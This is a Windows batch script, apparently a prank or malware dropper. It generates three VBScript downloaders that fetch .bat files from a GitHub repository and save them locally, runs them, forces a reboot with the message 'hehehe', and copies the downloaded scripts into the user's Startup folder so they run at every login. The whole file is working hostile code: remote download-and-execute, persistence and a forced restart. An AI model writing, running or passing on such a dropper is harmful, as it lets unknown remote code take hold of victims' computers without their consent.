@echo off
color 04
rem Hey! this smol chunk is from delme.
echo ' Set your settings >>downloader.vbs
echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/g.bat" >>downloader.vbs
echo     strHDLocation = "c.bat" >>downloader.vbs
echo ' Fetch the file >>downloader.vbs
echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>downloader.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>downloader.vbs
echo     objXMLHTTP.send() >>downloader.vbs
echo     If objXMLHTTP.Status = 200 Then >>downloader.vbs
echo       Set objADOStream = CreateObject("ADODB.Stream") >>downloader.vbs
echo       objADOStream.Open >>downloader.vbs
echo       objADOStream.Type = 1 'adTypeBinary >>downloader.vbs
echo       objADOStream.Write objXMLHTTP.ResponseBody >>downloader.vbs
echo       objADOStream.Position = 0    'Set the stream position to the start >>downloader.vbs
echo       Set objFSO = Createobject("Scripting.FileSystemObject") >>downloader.vbs
echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>downloader.vbs
echo       Set objFSO = Nothing >>downloader.vbs
echo       objADOStream.SaveToFile strHDLocation >>downloader.vbs
echo       objADOStream.Close >>downloader.vbs
echo       Set objADOStream = Nothing >>downloader.vbs
echo     End if >>downloader.vbs
echo     Set objXMLHTTP = Nothing >>downloader.vbs
start "" downloader.vbs
rem ------------------------------------------------------------------------------------
echo ' Set your settings >>e.vbs
echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/f.bat" >>e.vbs
echo     strHDLocation = "l.bat" >>e.vbs
echo ' Fetch the file >>e.vbs
echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>e.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>e.vbs
echo     objXMLHTTP.send() >>e.vbs
echo     If objXMLHTTP.Status = 200 Then >>e.vbs
echo       Set objADOStream = CreateObject("ADODB.Stream") >>e.vbs
echo       objADOStream.Open >>e.vbs
echo       objADOStream.Type = 1 'adTypeBinary >>e.vbs
echo       objADOStream.Write objXMLHTTP.ResponseBody >>e.vbs
echo       objADOStream.Position = 0    'Set the stream position to the start >>e.vbs
echo       Set objFSO = Createobject("Scripting.FileSystemObject") >>e.vbs
echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>e.vbs
echo       Set objFSO = Nothing >>e.vbs
echo       objADOStream.SaveToFile strHDLocation >>e.vbs
echo       objADOStream.Close >>e.vbs
echo       Set objADOStream = Nothing >>e.vbs
echo     End if >>e.vbs
echo     Set objXMLHTTP = Nothing >>e.vbs
start "" e.vbs
rem ------------------------------------------------------------------------------------
echo ' Set your settings >>m.vbs
echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/a.bat" >>m.vbs
echo     strHDLocation = "r.bat" >>m.vbs
echo ' Fetch the file >>m.vbs
echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>m.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>m.vbs
echo     objXMLHTTP.send() >>m.vbs
echo     If objXMLHTTP.Status = 200 Then >>m.vbs
echo       Set objADOStream = CreateObject("ADODB.Stream") >>m.vbs
echo       objADOStream.Open >>m.vbs
echo       objADOStream.Type = 1 'adTypeBinary >>m.vbs
echo       objADOStream.Write objXMLHTTP.ResponseBody >>m.vbs
echo       objADOStream.Position = 0    'Set the stream position to the start >>m.vbs
echo       Set objFSO = Createobject("Scripting.FileSystemObject") >>m.vbs
echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>m.vbs
echo       Set objFSO = Nothing >>m.vbs
echo       objADOStream.SaveToFile strHDLocation >>m.vbs
echo       objADOStream.Close >>m.vbs
echo       Set objADOStream = Nothing >>m.vbs
echo     End if >>m.vbs
echo     Set objXMLHTTP = Nothing >>m.vbs
start "" m.vbs
shutdown /r /t 5 /c "hehehe"
copy c.bat "%userprofile%\Start Menu\Programs\Startup\c.bat"
copy l.bat "%userprofile%\Start Menu\Programs\Startup\l.bat"
copy r.bat "%userprofile%\Start Menu\Programs\Startup\r.bat"
pause
